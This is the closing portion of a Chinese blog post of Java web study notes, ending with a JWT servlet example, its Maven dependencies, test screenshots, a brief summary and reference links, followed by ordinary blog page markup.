<span class="keyword">if</span>(!success) &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;参数错误！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String action = req.getParameter(<span class="string">&quot;action&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> success = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(action != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;clear&quot;</span>.equals(action.toLowerCase(Locale.ROOT))) &#123;</span><br><span class="line">                clear(req, resp);</span><br><span class="line">                success = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!success) &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;参数错误！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>以及 <code>pom.xml</code> 的依赖配置👇</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.0-b180830.0359<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.activation<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>activation<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="测试-2">- 测试 -</h5>
<p><code>生成页面</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241939057.png" alt="image-20220224193938915"></p>
<p>点击生成后👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241940349.png" alt="image-20220224194055169"></p>
<p><code>信息页面</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241941845.png" alt="image-20220224194116678"></p>
<p><code>清除页面</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241941753.png" alt="image-20220224194130604"></p>
<h2 id="总结">- 总结 -</h2>
<p>可算是过了一遍基础，看了下后面还有很多东西得学。不过无论如何先把基础打好了才是最重要的，继续往下学吧。</p>
<h2 id="参考">- 参考 -</h2>
<ul>
<li><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/3980.html">http://c.biancheng.net/view/3980.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/">https://www.w3cschool.cn/jsp/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/whgk/p/6399262.html">https://www.cnblogs.com/whgk/p/6399262.html</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Forward__/article/details/57079115">https://blog.csdn.net/Forward__/article/details/57079115</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/gehulushang/article/details/88783570">https://blog.csdn.net/gehulushang/article/details/88783570</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jiangfeilong/p/10710273.html">https://www.cnblogs.com/jiangfeilong/p/10710273.html</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37651267/article/details/90962152">https://blog.csdn.net/qq_37651267/article/details/90962152</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011024652/article/details/52293932">https://blog.csdn.net/u011024652/article/details/52293932</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37138756/article/details/103499429">https://blog.csdn.net/qq_37138756/article/details/103499429</a></li>
</ul>


        <hr>
        <!-- Pager -->
        <ul class="pager">
          
          
          <li class="next">
            <a href="/posts/320531414/" data-toggle="tooltip" data-placement="top" title="学习笔记 - java反序列化(一)">Next Post &rarr;</a>
          </li>
          
        </ul>

        
        <!-- tip start -->
        <!-- tip -->
<!-- tip start -->
<div class="tip">
  <p>
    
      如果您喜欢此博客或发现它对您有用，则欢迎对此发表评论。也欢迎您共享此博客，以便更多人可以参与。如果博客中使用的图像侵犯了您的版权，请与作者联系以将其删除。谢谢 ！
    
  </p>
</div>
<!-- tip end -->

        <!-- tip end -->
        

        
        <!-- Sharing Srtart -->
        <!-- Social Social Share Post -->
<!-- Docs:https://github.com/overtrue/share.js -->

<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
  <ul class="list-inline text-center social-share-ul">
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-twitter">
        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a class="social-share-icon icon-wechat">
        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-weibo">
        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-qq">
        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon" href="mailto:?subject=学习笔记 - java-web学习(一)&body=Hi,I found this website and thought you might like it https://morblog.cc/posts/82715091/">
        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
      </a>
    </li>
  </ul>
</div>

<!-- css & js -->
<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

        <!-- Sharing End -->
        
        <hr>

        <!-- comments start -->
        <!-- 1. gitalk comment -->


<!-- 2. gitment comment -->


<!-- 4. disqus comment -->

  <!-- disqus comment start -->

  <div class="comment">
    <div id="disqus_thread" class="disqus-thread"></div>
  </div>

  <!-- disqus embedded js code start (one page only need to embed once) -->
  <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = "moryyds-1";
    var disqus_identifier = "https://morblog.cc/posts/82715091/";
    var disqus_url = "https://morblog.cc/posts/82715091/";

    (function () {
      var dsq = document.createElement('script');
      dsq.type = 'text/javascript';
      dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>
  <!-- disqus embedded js code start end -->

  <!-- disqus comment end -->


        <!-- comments end -->
        <hr>

      </div>

      <!-- Catalog: Tabe of Content -->
      <!-- Table of Contents -->

    
      <aside id="sidebar">
        <div id="toc" class="toc-article">
        <strong class="toc-title">目录</strong>
        
          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">学习笔记 - java-web学习(一)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">- 前言 -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">- 环境搭建 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#tomcat"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">- tomcat -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-nav-number">1.2.1.1.</span> <span class="toc-nav-text">- 安装 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-nav-number">1.2.1.2.</span> <span class="toc-nav-text">- 环境变量 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%90%AF%E5%8A%A8-%E5%81%9C%E6%AD%A2"><span class="toc-nav-number">1.2.1.3.</span> <span class="toc-nav-text">- 启动&#x2F;停止 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%85%8D%E7%BD%AE"><span class="toc-nav-number">1.2.1.4.</span> <span class="toc-nav-text">- 配置 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#IntelliJ-IDEA"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">- IntelliJ IDEA -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%85%8D%E7%BD%AEtomcat"><span class="toc-nav-number">1.2.2.1.</span> <span class="toc-nav-text">- 配置tomcat -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%96%B0%E5%BB%BA%E9%A1%B9%E7%9B%AE"><span class="toc-nav-number">1.2.2.2.</span> <span class="toc-nav-text">- 新建项目 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%BF%90%E8%A1%8C"><span class="toc-nav-number">1.2.2.3.</span> <span class="toc-nav-text">- 运行 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-2"><span class="toc-nav-number">1.2.2.4.</span> <span class="toc-nav-text">- 环境变量 -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%86%85%E5%AE%B9"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">- 内容 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#servlet"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">- servlet -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-nav-number">1.3.1.1.</span> <span class="toc-nav-text">- 生命周期 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BB%A3%E7%A0%81"><span class="toc-nav-number">1.3.1.2.</span> <span class="toc-nav-text">- 代码 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-nav-number">1.3.1.3.</span> <span class="toc-nav-text">- 示例 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#servlet%E5%92%8Ctomcat%E8%BF%87%E7%A8%8B"><span class="toc-nav-number">1.3.1.4.</span> <span class="toc-nav-text">- servlet和tomcat过程 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#jsp"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">- jsp -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#jsp%E5%92%8Cserlvet%E8%81%94%E7%B3%BB"><span class="toc-nav-number">1.3.2.1.</span> <span class="toc-nav-text">- jsp和serlvet联系 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#jsp%E5%92%8Cservlet%E5%8C%BA%E5%88%AB"><span class="toc-nav-number">1.3.2.2.</span> <span class="toc-nav-text">- jsp和servlet区别 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#jsp%E5%92%8Ctomcat%E8%BF%87%E7%A8%8B"><span class="toc-nav-number">1.3.2.3.</span> <span class="toc-nav-text">- jsp和tomcat过程 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-nav-number">1.3.2.4.</span> <span class="toc-nav-text">- 语法 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%8C%87%E4%BB%A4-directive"><span class="toc-nav-number">1.3.2.5.</span> <span class="toc-nav-text">- 指令(directive) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#page"><span class="toc-nav-number">1.3.2.5.1.</span> <span class="toc-nav-text">- page -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#include"><span class="toc-nav-number">1.3.2.5.2.</span> <span class="toc-nav-text">- include -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#taglib"><span class="toc-nav-number">1.3.2.5.3.</span> <span class="toc-nav-text">- taglib -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%A1%8C%E4%B8%BA-action"><span class="toc-nav-number">1.3.2.6.</span> <span class="toc-nav-text">- 行为(action) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#include-2"><span class="toc-nav-number">1.3.2.6.1.</span> <span class="toc-nav-text">- include -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#bean"><span class="toc-nav-number">1.3.2.6.2.</span> <span class="toc-nav-text">- bean -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#xml"><span class="toc-nav-number">1.3.2.6.3.</span> <span class="toc-nav-text">- xml -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#forward"><span class="toc-nav-number">1.3.2.6.4.</span> <span class="toc-nav-text">- forward -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%B9%9D%E5%A4%A7%E5%86%85%E7%BD%AE%E5%AF%B9%E8%B1%A1"><span class="toc-nav-number">1.3.2.7.</span> <span class="toc-nav-text">- 九大内置对象 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%9B%9B%E5%A4%A7%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="toc-nav-number">1.3.2.8.</span> <span class="toc-nav-text">- 四大作用域 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#application"><span class="toc-nav-number">1.3.2.8.1.</span> <span class="toc-nav-text">- application -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#page-2"><span class="toc-nav-number">1.3.2.8.2.</span> <span class="toc-nav-text">- page -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#request"><span class="toc-nav-number">1.3.2.8.3.</span> <span class="toc-nav-text">- request -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#session"><span class="toc-nav-number">1.3.2.8.4.</span> <span class="toc-nav-text">- session -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%A0%87%E7%AD%BE-tag"><span class="toc-nav-number">1.3.2.9.</span> <span class="toc-nav-text">- 标签(tag) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#JSTL%E6%A0%87%E7%AD%BE"><span class="toc-nav-number">1.3.2.9.1.</span> <span class="toc-nav-text">- JSTL标签 -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E7%AD%BE"><span class="toc-nav-number">1.3.2.9.2.</span> <span class="toc-nav-text">- 自定义标签 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-nav-number">1.3.2.10.</span> <span class="toc-nav-text">- EL表达式 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8-filter"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">- 过滤器(filter) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BB%A3%E7%A0%81-2"><span class="toc-nav-number">1.3.3.1.</span> <span class="toc-nav-text">- 代码 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-nav-number">1.3.3.2.</span> <span class="toc-nav-text">- 自定义过滤器 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8D%95%E4%B8%AA%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-nav-number">1.3.3.2.1.</span> <span class="toc-nav-text">- 单个过滤器 -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%A4%9A%E4%B8%AA%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-nav-number">1.3.3.2.2.</span> <span class="toc-nav-text">- 多个过滤器 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#filter%E5%92%8Ctomcat%E8%BF%87%E7%A8%8B"><span class="toc-nav-number">1.3.3.3.</span> <span class="toc-nav-text">- filter和tomcat过程 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%9B%91%E5%90%AC%E5%99%A8-listener"><span class="toc-nav-number">1.3.4.</span> <span class="toc-nav-text">- 监听器(listener) -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%9B%91%E5%90%AC%E5%99%A8%E5%88%92%E5%88%86"><span class="toc-nav-number">1.3.4.1.</span> <span class="toc-nav-text">- 监听器划分 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-nav-number">1.3.4.2.</span> <span class="toc-nav-text">- 自定义监听器 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%9F%9F%E5%AF%B9%E8%B1%A1%E8%87%AA%E8%BA%AB%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E9%94%80%E6%AF%81%E7%9A%84%E4%BA%8B%E4%BB%B6"><span class="toc-nav-number">1.3.4.2.1.</span> <span class="toc-nav-text">- 域对象自身的创建和销毁的事件 -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%9F%9F%E5%AF%B9%E8%B1%A1%E4%B8%AD%E5%B1%9E%E6%80%A7%E5%8F%98%E5%8A%A8%E7%9A%84%E4%BA%8B%E4%BB%B6"><span class="toc-nav-number">1.3.4.2.2.</span> <span class="toc-nav-text">- 域对象中属性变动的事件 -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E7%BB%91%E5%AE%9A%E5%88%B0-HttpSession-%E5%9F%9F%E4%B8%AD%E6%9F%90%E4%B8%AA%E5%AF%B9%E8%B1%A1%E7%8A%B6%E6%80%81%E7%9A%84%E4%BA%8B%E4%BB%B6"><span class="toc-nav-number">1.3.4.2.3.</span> <span class="toc-nav-text">- 绑定到 HttpSession 域中某个对象状态的事件 -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-nav-number">1.3.5.</span> <span class="toc-nav-text">- 其他 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%AE%9E%E4%BE%8B"><span class="toc-nav-number">1.3.5.1.</span> <span class="toc-nav-text">- 用户管理实例 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E8%A6%81%E6%B1%82"><span class="toc-nav-number">1.3.5.1.1.</span> <span class="toc-nav-text">- 要求 -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-nav-number">1.3.5.1.2.</span> <span class="toc-nav-text">- 实现 -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-nav-number">1.3.5.1.3.</span> <span class="toc-nav-text">- 测试 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#jwt%E7%AE%A1%E7%90%86%E5%AE%9E%E4%BE%8B"><span class="toc-nav-number">1.3.5.2.</span> <span class="toc-nav-text">- jwt管理实例 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E8%A6%81%E6%B1%82-2"><span class="toc-nav-number">1.3.5.2.1.</span> <span class="toc-nav-text">- 要求 -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%AE%9E%E7%8E%B0-2"><span class="toc-nav-number">1.3.5.2.2.</span> <span class="toc-nav-text">- 实现 -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%B5%8B%E8%AF%95-2"><span class="toc-nav-number">1.3.5.2.3.</span> <span class="toc-nav-text">- 测试 -</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">- 总结 -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">- 参考 -</span></a></li></ol></li></ol>
        
        </div>
      </aside>
    



      <!-- Sidebar Container -->
      <div class="
                col-lg-8 col-lg-offset-1
                col-md-10 col-md-offset-1
                sidebar-container">

        <!-- Featured Tags -->
        
        <section>
          <!-- no hr -->
          <h5>
            <a href="/tags/">标签</a>
          </h5>
          <div class="tags">
            
            <a class="tag" href="/tags/#安全" title="安全">安全</a>
            
            <a class="tag" href="/tags/#JAVA" title="JAVA">JAVA</a>
            
          </div>
        </section>
        

        <!-- Friends Blog -->
        
        <hr>
        <h5>朋友们</h5>
        <ul class="list-inline">

          
          <li>
            <a href="https://www.cnblogs.com/Yhck/" target="_blank">Yhck</a>
          </li>
          
          <li>
            <a href="https://www.cnblogs.com/wkzb/" target="_blank">beiwo</a>
          </li>
          
          <li>
            <a href="https://leohearts.com/" target="_blank">Leohearts</a>
          </li>
          
          <li>
            <a href="https://longlone.top/" target="_blank">Longlone</a>
          </li>
          
          <li>
            <a href="http://na0hblog.top/" target="_blank">Na0h</a>
          </li>
          
        </ul>
        
      </div>
    </div>
  </div>
</article>



<!-- anchorjs start -->
<!-- async load function -->
<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
<script type="text/javascript">
  // async load function
  function async (u, c) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) {
      o.addEventListener('load', function(e) {
        c(null, e);
      }, false);
    }
    s.parentNode.insertBefore(o, s);
  };
</script>
<script type="text/javascript">
  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
    anchors.options = {
      visible: 'hover',
      placement: 'left',
      // icon: 'ℬ'
      icon: '❡'
    };
    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
  });
</script>
<style>
  /* place left on bigger screen */
  @media all and (min-width: 800px) {
    .anchorjs-link {
      position: absolute;
      left: -0.75em;
      font-size: 1.1em;
      margin-top: -0.1em;
    }
  }
</style>

<!-- anchorjs end -->



		<!-- Footer (contains ThemeColor、viewer) -->
		<!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center">
          

          
            <li>
              <a target="_blank" href="https://github.com/Morouu">
                <span class="fa-stack fa-lg">
                  <i class="fa fa-circle fa-stack-2x"></i>
                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                </span>
              </a>
            </li>
          

          

          

          

          

          

          

        </ul>
        <p class="copyright text-muted">
         &copy; 2022
		 <i class="icon-smile"></i>
          morouu
          <br>
          Theme by
          <a target="_blank" rel="noopener" href="http://beantech.org">BeanTech</a>
          <span style="display: inline-block; margin: 0 5px;">
            <i class="fa fa-heart"></i>
          </span>
          re-Ported by
          <a target="_blank" rel="noopener" href="https://v-vincen.life/">Live My Life</a>
          |
          <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="91px" height="20px" src="https://ghbtns.com/github-btn.html?user=V-Vincen&repo=V-Vincen.github.io&type=star&count=true"></iframe>
        <div class=" copyright text-muted live_time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"> 0 天 0 小时 0 分 0 秒</span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2021-12-27T20:23:15');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
